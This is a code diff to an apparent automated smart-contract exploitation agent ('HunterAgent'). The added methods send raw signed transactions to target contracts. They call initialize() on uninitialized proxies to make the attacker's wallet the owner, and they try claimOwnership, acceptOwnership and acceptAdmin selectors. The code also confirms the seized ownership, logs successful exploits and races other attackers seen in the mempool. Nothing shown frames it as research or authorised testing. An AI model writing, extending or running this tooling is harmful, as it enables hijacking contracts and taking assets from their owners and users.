@@ -721,20 +721,24 @@ class HunterAgent:
 
         for sig in init_sigs:
             try:
+                gas_price = w3.eth.gas_price
+                nonce = w3.eth.get_transaction_count(wallet.address)
+
+                # Build EIP-1559 tx
                 tx = {
                     'from': wallet.address,
                     'to': Web3.to_checksum_address(target_addr),
                     'data': sig['data'],
                     'gas': 200_000,
-                    'maxFeePerGas': w3.eth.gas_price * 2,
-                    'maxPriorityFeePerGas': w3.to_wei(0.001, 'gwei'),
-                    'nonce': w3.eth.get_transaction_count(wallet.address),
+                    'maxFeePerGas': gas_price * 2,
+                    'maxPriorityFeePerGas': max(int(gas_price * 0.1), int(w3.to_wei(0.001, 'gwei'))),
+                    'nonce': nonce,
                     'chainId': chain_id,
                 }
 
-                # Use MEV protection for the tx
                 print(f'  [PROXY-EXPLOIT] Trying {sig["name"]}...')
                 signed = wallet.sign_transaction(tx)
+                raw = getattr(signed, 'raw_transaction', None) or getattr(signed, 'rawTransaction', b'')
 
                 # Send via MEV relay if available, otherwise direct
                 try:
@@ -744,11 +748,21 @@ class HunterAgent:
                     )
                     tx_hash = result.get('tx_hash', '')
                 except Exception:
-                    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+                    tx_hash_bytes = w3.eth.send_raw_transaction(raw)
+                    tx_hash = tx_hash_bytes.hex() if isinstance(tx_hash_bytes, bytes) else str(tx_hash_bytes)
 
                 if tx_hash:
                     print(f'  [PROXY-EXPLOIT] TX SENT: {tx_hash[:16]}...')
-                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+                    # Wait for receipt
+                    if isinstance(tx_hash, str) and tx_hash.startswith('0x'):
+                        tx_bytes = bytes.fromhex(tx_hash.replace('0x', ''))
+                    elif isinstance(tx_hash, bytes):
+                        tx_bytes = tx_hash
+                        tx_hash = '0x' + tx_hash.hex()
+                    else:
+                        tx_bytes = bytes.fromhex(str(tx_hash).replace('0x', ''))
+                        tx_hash = '0x' + tx_bytes.hex()
+                    receipt = w3.eth.wait_for_transaction_receipt(tx_bytes, timeout=120)
                     if receipt.status == 1:
                         print(f'  [PROXY-EXPLOIT] SUCCESS! Gas: {receipt.gasUsed}')
                         self.total_exploits_succeeded += 1
@@ -762,11 +776,10 @@ class HunterAgent:
                             new_owner = '0x' + owner_ret[12:].hex()
                             if new_owner.lower() == wallet.address.lower():
                                 print(f'  [PROXY-EXPLOIT] CONFIRMED OWNERSHIP!')
-                                # Log success
                                 self.db.log_execution(
                                     contract_address=target_addr, chain_id=chain_id,
                                     action='proxy_initialization',
-                                    tx_hash=tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash),
+                                    tx_hash=tx_hash,
                                     gas_used=receipt.gasUsed, success=True,
                                     metadata={'exploit_type': 'uninitialized_proxy',
                                               'new_owner': wallet.address},
@@ -785,7 +798,7 @@ class HunterAgent:
                         self.db.log_execution(
                             contract_address=target_addr, chain_id=chain_id,
                             action='proxy_initialization',
-                            tx_hash=tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash),
+                            tx_hash=tx_hash,
                             gas_used=receipt.gasUsed, success=True,
                         )
                     else:
@@ -837,7 +850,6 @@ class HunterAgent:
         # v3.0: Check mempool for competing attacks
         if self.mempool.is_target_under_attack(chain_id, target_addr):
             print(f'  [MEMPOOL] RACE CONDITION: Another hunter is attacking this target!')
-            # Still attempt via MEV protection (Flashbots bundles are atomic)
 
         print(f'\n  {"!"*60}')
         print(f'  AUTO-EXPLOIT TRIGGERED')
@@ -858,6 +870,13 @@ class HunterAgent:
                 chain_id=chain_id,
                 target_address=target_addr,
             )
+
+            # v3.3: If pipeline failed at PoC/compile step, try direct RPC exploit
+            if not result.get('exploit_successful'):
+                compile_step = result.get('steps', {}).get('compile', {})
+                if not compile_step.get('success') and 'solcx' in compile_step.get('error', ''):
+                    print(f'  [FALLBACK] solcx unavailable, trying direct RPC exploit...')
+                    result = self._direct_rpc_exploit(finding, chain_id, target_addr)
 
             if result.get('exploit_successful'):
                 self.total_exploits_succeeded += 1
@@ -915,6 +934,121 @@ class HunterAgent:
                 contract_address=target_addr, chain_id=chain_id,
                 action='pipeline_error', success=False, error=str(e),
             )
+
+    def _direct_rpc_exploit(self, finding: dict, chain_id: int, target_addr: str) -> dict:
+        """v3.3: Direct RPC exploit without PoC compilation.
+
+        For vulnerabilities that can be exploited with a single transaction
+        (e.g., uninitialized proxy, zero proposal threshold, claimOwnership),
+        we don't need to compile Solidity. Just send the right calldata.
+        """
+        category = finding.get('category', '')
+        result = {
+            'finding_title': finding.get('title', ''),
+            'target': target_addr,
+            'chain_id': chain_id,
+            'steps': {'direct_rpc': {'success': False}},
+            'final_profit_eth': 0, 'final_profit_usd': 0,
+            'exploit_successful': False,
+        }
+
+        if not WALLET_PRIVATE_KEY:
+            result['steps']['direct_rpc'] = {'success': False, 'error': 'No wallet'}
+            return result
+
+        try:
+            w3 = self.executor._get_w3(chain_id)
+            wallet = self.executor._get_wallet(chain_id)
+            from web3 import Web3
+
+            # Pattern 1: Uninitialized proxy → call initialize()
+            if 'Initialization' in category or 'uninitial' in finding.get('title', '').lower():
+                print(f'  [DIRECT] Trying initialize() call...')
+                return self._exploit_uninitialized_proxy_direct(w3, wallet, target_addr, chain_id, finding)
+
+            # Pattern 2: claimOwnership / acceptAdmin
+            if 'Access Control' in category:
+                for sig_name, sig_data in [
+                    ('claimOwnership()', '0x4e71e0c8'),
+                    ('acceptOwnership()', '0x791ac947'),
+                    ('acceptAdmin()', '0x79ba5097'),
+                ]:
+                    try:
+                        tx_dict = {
+                            'to': Web3.to_checksum_address(target_addr),
+                            'data': sig_data,
+                            'gas': 100_000,
+                        }
+                        tx, signed, raw = self.executor._build_tx(w3, wallet, chain_id, tx_dict)
+                        tx_hash = w3.eth.send_raw_transaction(raw)
+                        tx_hash_str = tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash)
+                        receipt, tx_hash_str = self.executor._wait_for_tx(w3, tx_hash_str, timeout=60)
+                        if receipt.status == 1:
+                            print(f'  [DIRECT] {sig_name} SUCCEEDED!')
+                            self.db.log_execution(
+                                contract_address=target_addr, chain_id=chain_id,
+                                action=f'direct_{sig_name}', tx_hash=tx_hash_str,
+                                gas_used=receipt.gasUsed, success=True,
+                            )
+                            result['exploit_successful'] = True
+                            result['steps']['direct_rpc'] = {'success': True, 'tx_hash': tx_hash_str}
+                            return result
+                    except Exception as e:
+                        print(f'  [DIRECT] {sig_name} failed: {str(e)[:80]}')
+                        continue
+
+            result['steps']['direct_rpc'] = {'success': False, 'error': 'No direct exploit pattern matched'}
+        except Exception as e:
+            result['steps']['direct_rpc'] = {'success': False, 'error': str(e)}
+
+        return result
+
+    def _exploit_uninitialized_proxy_direct(self, w3, wallet, target_addr, chain_id, finding):
+        """Direct RPC call to initialize() on an uninitialized proxy."""
+        result = {
+            'finding_title': finding.get('title', ''),
+            'target': target_addr, 'chain_id': chain_id,
+            'steps': {}, 'final_profit_eth': 0, 'final_profit_usd': 0,
+            'exploit_successful': False,
+        }
+        from web3 import Web3
+
+        init_sigs = [
+            {'name': 'initialize(address)',
+             'data': Web3.keccak(text='initialize(address)')[:4] + b'\x00' * 12 + bytes.fromhex(wallet.address[2:])},
+            {'name': 'initialize()',
+             'data': Web3.keccak(text='initialize()')[:4]},
+        ]
+
+        for sig in init_sigs:
+            try:
+                tx_dict = {
+                    'to': Web3.to_checksum_address(target_addr),
+                    'data': sig['data'],
+                    'gas': 200_000,
+                }
+                tx, signed, raw = self.executor._build_tx(w3, wallet, chain_id, tx_dict)
+                tx_hash = w3.eth.send_raw_transaction(raw)
+                tx_hash_str = tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash)
+                print(f'  [DIRECT-PROXY] {sig["name"]} TX: {tx_hash_str[:16]}...')
+                receipt, tx_hash_str = self.executor._wait_for_tx(w3, tx_hash_str, timeout=120)
+                if receipt.status == 1:
+                    print(f'  [DIRECT-PROXY] SUCCESS!')
+                    self.db.log_execution(
+                        contract_address=target_addr, chain_id=chain_id,
+                        action='direct_proxy_init', tx_hash=tx_hash_str,
+                        gas_used=receipt.gasUsed, success=True,
+                    )
+                    result['exploit_successful'] = True
+                    result['steps']['direct_rpc'] = {'success': True, 'tx_hash': tx_hash_str}
+                    return result
+                else:
+                    print(f'  [DIRECT-PROXY] Reverted')
+            except Exception as e:
+                print(f'  [DIRECT-PROXY] {sig["name"]} failed: {str(e)[:80]}')
+
+        result['steps']['direct_rpc'] = {'success': False, 'error': 'All init sigs reverted'}
+        return result
 
     def _print_session_summary(self):
         stats = self.db.get_stats()
